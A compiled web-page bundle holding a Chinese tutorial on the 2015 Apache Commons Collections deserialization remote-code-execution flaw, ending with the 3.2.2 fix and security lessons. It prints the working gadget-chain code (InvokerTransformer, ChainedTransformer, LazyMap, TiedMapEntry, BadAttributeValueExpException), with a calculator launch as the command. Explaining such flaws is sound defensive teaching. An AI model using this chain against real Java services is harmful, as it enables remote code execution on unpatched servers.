import{_ as e,o as n,c as o,e as a}from"./app-BihAYnmf.js";const t={},r=a(`<p>Apache-Commons-Collections这个框架，相信每一个Java程序员都不陌生，这是一个非常著名的开源框架。</p><p>但是，他其实也曾经被爆出过序列化安全漏洞，可以被远程执行命令。</p><h3 id="背景" tabindex="-1"><a class="header-anchor" href="#背景"><span>背景</span></a></h3><p>Apache Commons是Apache软件基金会的项目，Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。</p><p>**Commons Collections包为Java标准的Collections API提供了相当好的补充。**在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><p>Commons Collections的最新版是4.4，但是使用比较广泛的还是3.x的版本。其实，<strong>在3.2.1以下版本中，存在一个比较大的安全漏洞，可以被利用来进行远程命令执行。</strong></p><p>这个漏洞在2015年第一次被披露出来，但是业内一直称称这个漏洞为&quot;2015年最被低估的漏洞&quot;。</p><p>因为这个类库的使用实在是太广泛了，首当其中的就是很多Java Web Server，这个漏洞在当时横扫了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。</p><p>之后，Gabriel Lawrence和Chris Frohoff两位大神在《Marshalling Pickles how deserializing objects can ruin your day》中提出如何利用Apache Commons Collection实现任意代码执行。</p><h3 id="问题复现" tabindex="-1"><a class="header-anchor" href="#问题复现"><span>问题复现</span></a></h3><p>这个问题主要会发生在Apache Commons Collections的3.2.1以下版本，本次使用3.1版本进行测试，JDK版本为Java 8。</p><h4 id="利用transformer攻击" tabindex="-1"><a class="header-anchor" href="#利用transformer攻击"><span>利用Transformer攻击</span></a></h4><p>Commons Collections中提供了一个Transformer接口，主要是可以用来进行类型装换的，这个接口有一个实现类是和我们今天要介绍的漏洞有关的，那就是InvokerTransformer。</p><p><strong>InvokerTransformer提供了一个transform方法，该方法核心代码只有3行，主要作用就是通过反射对传入的对象进行实例化，然后执行其iMethodName方法。</strong></p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944480560097.jpg" alt=""></p><p>而需要调用的iMethodName和需要使用的参数iArgs其实都是InvokerTransformer类在实例化时设定进来的，这个类的构造函数如下：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944485613275.jpg" alt=""></p><p>也就是说，使用这个类，理论上可以执行任何方法。那么，我们就可以利用这个类在Java中执行外部命令。</p><p>我们知道，想要在Java中执行外部命令，需要使用<code>Runtime.getRuntime().exec(cmd)</code>的形式，那么，我们就想办法通过以上工具类实现这个功能。</p><p>首先，通过InvokerTransformer的构造函数设置好我们要执行的方法以及参数：</p><pre><code>Transformer transformer = new InvokerTransformer(&quot;exec&quot;,
        new Class[] {String.class},
        new Object[] {&quot;open /Applications/Calculator.app&quot;});
</code></pre><p>通过，构造函数，我们设定方法名为<code>exec</code>，执行的命令为<code>open /Applications/Calculator.app</code>，即打开mac电脑上面的计算器（windows下命令：<code>C:\\\\Windows\\\\System32\\\\calc.exe</code>）。</p><p>然后，通过InvokerTransformer实现对<code>Runtime</code>类的实例化：</p><pre><code>transformer.transform(Runtime.getRuntime());
</code></pre><p>运行程序后，会执行外部命令，打开电脑上的计算机程序：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944494651843.jpg" alt=""></p><p>至此，我们知道可以利用InvokerTransformer来调用外部命令了，那是不是只需要把一个我们自定义的InvokerTransformer序列化成字符串，然后再反序列化，接口实现远程命令执行：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944505042521.jpg" alt=""></p><p>先将transformer对象序列化到文件中，再从文件中读取出来，并且执行其transform方法，就实现了攻击。</p><h4 id="你以为这就完了" tabindex="-1"><a class="header-anchor" href="#你以为这就完了"><span>你以为这就完了？</span></a></h4><p>但是，如果事情只有这么简单的话，那这个漏洞应该早就被发现了。想要真的实现攻击，那么还有几件事要做。</p><p>因为，<code>newTransformer.transform(Runtime.getRuntime());</code>这样的代码，不会有人真的在代码中写的。</p><p>如果没有了这行代码，还能实现执行外部命令么？</p><p>这就要利用到Commons Collections中提供了另一个工具那就是ChainedTransformer，这个类是Transformer的实现类。</p><p><strong>ChainedTransformer类提供了一个transform方法，他的功能遍历他的iTransformers数组，然后依次调用其transform方法，并且每次都返回一个对象，并且这个对象可以作为下一次调用的参数。</strong></p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944497629664.jpg" alt=""></p><p>那么，我们可以利用这个特性，来自己实现和<code>transformer.transform(Runtime.getRuntime());</code>同样的功能：</p><pre><code> Transformer[] transformers = new Transformer[] {
    //通过内置的ConstantTransformer来获取Runtime类
    new ConstantTransformer(Runtime.class),
    //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
    new InvokerTransformer(&quot;getMethod&quot;,
        new Class[] {String.class, Class[].class },
        new Object[] {&quot;getRuntime&quot;, new Class[0] }),
    //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象
    new InvokerTransformer(&quot;invoke&quot;,
        new Class[] {Object.class, Object[].class },
        new Object[] {null, new Object[0] }),
    //反射调用exec方法
    new InvokerTransformer(&quot;exec&quot;,
        new Class[] {String.class },
        new Object[] {&quot;open /Applications/Calculator.app&quot;})
};

Transformer transformerChain = new ChainedTransformer(transformers);
</code></pre><p>在拿到一个transformerChain之后，直接调用他的transform方法，传入任何参数都可以，执行之后，也可以实现打开本地计算器程序的功能：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944539116926.jpg" alt=""></p><p>那么，结合序列化，现在的攻击更加进了一步，不再需要传入<code>newTransformer.transform(Runtime.getRuntime());</code>这样的代码了，只要代码中有 <code>transformer.transform()</code>方法的调用即可，无论里面是什么参数：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944538564178.jpg" alt=""></p><h4 id="攻击者不会满足于此" tabindex="-1"><a class="header-anchor" href="#攻击者不会满足于此"><span>攻击者不会满足于此</span></a></h4><p>但是，一般也不会有程序员会在代码中写这样的代码。</p><p>那么，攻击手段就需要更进一步，真正做到&quot;不需要程序员配合&quot;。</p><p>于是，攻击者们发现了在Commons Collections中提供了一个LazyMap类，这个类的get会调用transform方法。（Commons Collections还真的是懂得黑客想什么呀。）</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944509076736.jpg" alt=""></p><p>那么，现在的攻击方向就是想办法调用到LazyMap的get方法，并且把其中的factory设置成我们的序列化对象就行了。</p><p>顺藤摸瓜，可以找到Commons Collections中的TiedMapEntry类的getValue方法会调用到LazyMap的get方法，而TiedMapEntry类的getValue又会被其中的toString()方法调用到。</p><pre><code>public String toString() {
    return getKey() + &quot;=&quot; + getValue();
}

public Object getValue() {
    return map.get(key);
}
</code></pre><p>那么，现在的攻击门槛就更低了一些，只要我们自己构造一个TiedMapEntry，并且将他进行序列化，这样，只要有人拿到这个序列化之后的对象，调用他的toString方法的时候，就会自动触发bug。</p><pre><code>Transformer transformerChain = new ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;key&quot;);
</code></pre><p>我们知道，toString会在很多时候被隐式调用，如输出的时候(<code>System.out.println(ois.readObject());</code>)，代码示例如下：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944537562975.jpg" alt=""></p><p>现在，黑客只需要把自己构造的TiedMapEntry的序列化后的内容上传给应用程序，应用程序在反序列化之后，如果调用了toString就会被攻击。</p><h4 id="只要反序列化-就会被攻击" tabindex="-1"><a class="header-anchor" href="#只要反序列化-就会被攻击"><span>只要反序列化，就会被攻击</span></a></h4><p>那么，有没有什么办法，让代码只要对我们准备好的内容进行反序列化就会遭到攻击呢？</p><p>倒还真的被发现了，只要满足以下条件就行了：</p><p>那就是在某个类的readObject会调用到上面我们提到的LazyMap或者TiedMapEntry的相关方法就行了。因为Java反序列化的时候，会调用对象的readObject方法。</p><p>通过深入挖掘，黑客们找到了BadAttributeValueExpException、AnnotationInvocationHandler等类。这里拿BadAttributeValueExpException举例</p><p>BadAttributeValueExpException类是Java中提供的一个异常类，他的readObject方法直接调用了toString方法：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944519240647.jpg" alt=""></p><p>那么，攻击者只需要想办法把TiedMapEntry的对象赋值给代码中的valObj就行了。</p><p>通过阅读源码，我们发现，只要给BadAttributeValueExpException类中的成员变量val设置成一个TiedMapEntry类型的对象就行了。</p><p>这就简单了，通过反射就能实现：</p><pre><code>Transformer transformerChain = new ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;key&quot;);

BadAttributeValueExpException poc = new BadAttributeValueExpException(null);

// val是私有变量，所以利用下面方法进行赋值
Field valfield = poc.getClass().getDeclaredField(&quot;val&quot;);
valfield.setAccessible(true);
valfield.set(poc, entry);
</code></pre><p>于是，这时候，攻击就非常简单了，只需要把BadAttributeValueExpException对象序列化成字符串，只要这个字符串内容被反序列化，那么就会被攻击。</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944537014741.jpg" alt=""></p><h3 id="问题解决" tabindex="-1"><a class="header-anchor" href="#问题解决"><span>问题解决</span></a></h3><p>以上，我们复现了这个Apache Commons Collections类库带来的一个和反序列化有关的远程代码执行漏洞。</p><p>通过这个漏洞的分析，我们可以发现，只要有一个地方代码写的不够严谨，就可能会被攻击者利用。</p><p>因为这个漏洞影响范围很大，所以在被爆出来之后就被修复掉了，开发者只需要将Apache Commons Collections类库升级到3.2.2版本，即可避免这个漏洞。</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944526874284.jpg" alt="-w1382"></p><p>3.2.2版本对一些不安全的Java类的序列化支持增加了开关，默认为关闭状态。涉及的类包括</p><pre><code>CloneTransformer
ForClosure
InstantiateFactory
InstantiateTransformer
InvokerTransformer
PrototypeCloneFactory
PrototypeSerializationFactory,
WhileClosure
</code></pre><p>如在InvokerTransformer类中，自己实现了和序列化有关的writeObject()和 readObject()方法：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944525715616.jpg" alt=""></p><p>在两个方法中，进行了序列化安全的相关校验，校验实现代码如下：</p><p><img src="https://www.hollischuang.com/wp-content/uploads/2020/07/15944525999226.jpg" alt=""></p><p>在序列化及反序列化过程中，会检查对于一些不安全类的序列化支持是否是被禁用的，如果是禁用的，那么就会抛出<code>UnsupportedOperationException</code>，通过<code>org.apache.commons.collections.enableUnsafeSerialization</code>设置这个特性的开关。</p><p>将Apache Commons Collections升级到3.2.2以后，执行文中示例代码，将报错如下：</p><pre><code>Exception in thread &quot;main&quot; java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property &#39;org.apache.commons.collections.enableUnsafeSerialization&#39; to &#39;true&#39;, but you must ensure that your application does not de-serialize objects from untrusted sources.
    at org.apache.commons.collections.functors.FunctorUtils.checkUnsafeSerialization(FunctorUtils.java:183)
    at org.apache.commons.collections.functors.InvokerTransformer.writeObject(InvokerTransformer.java:155)
</code></pre><h3 id="后话" tabindex="-1"><a class="header-anchor" href="#后话"><span>后话</span></a></h3><p>本文介绍了Apache Commons Collections的历史版本中的一个反序列化漏洞。</p><p>如果你阅读本文之后，能够有以下思考，那么本文的目的就达到了：</p><p>1、代码都是人写的，有bug都是可以理解的</p><p>2、公共的基础类库，一定要重点考虑安全性问题</p><p>3、在使用公共类库的时候，要时刻关注其安全情况，一旦有漏洞爆出，要马上升级</p><p>4、安全领域深不见底，攻击者总能抽丝剥茧，一点点bug都可能被利用</p><p>参考资料： https://commons.apache.org/proper/commons-collections/release_3_2_2.html https://p0sec.net/index.php/archives/121/ https://www.freebuf.com/vuls/175252.html https://kingx.me/commons-collections-java-deserialization.html</p>`,90),p=[r];function s(c,i){return n(),o("div",null,p)}const m=e(t,[["render",s],["__file","bug-in-apache-commons-collections.html.vue"]]),d=JSON.parse('{"path":"/docs/java/java-basic/bug-in-apache-commons-collections.html","title":"","lang":"en-US","frontmatter":{},"headers":[{"level":3,"title":"背景","slug":"背景","link":"#背景","children":[]},{"level":3,"title":"问题复现","slug":"问题复现","link":"#问题复现","children":[]},{"level":3,"title":"问题解决","slug":"问题解决","link":"#问题解决","children":[]},{"level":3,"title":"后话","slug":"后话","link":"#后话","children":[]}],"git":{"createdTime":1715384499000,"updatedTime":1715384499000,"contributors":[{"name":"dong","email":"dwx_job@163.com","commits":1}]},"filePathRelative":"docs/java/java-basic/bug-in-apache-commons-collections.md"}');export{m as comp,d as data};
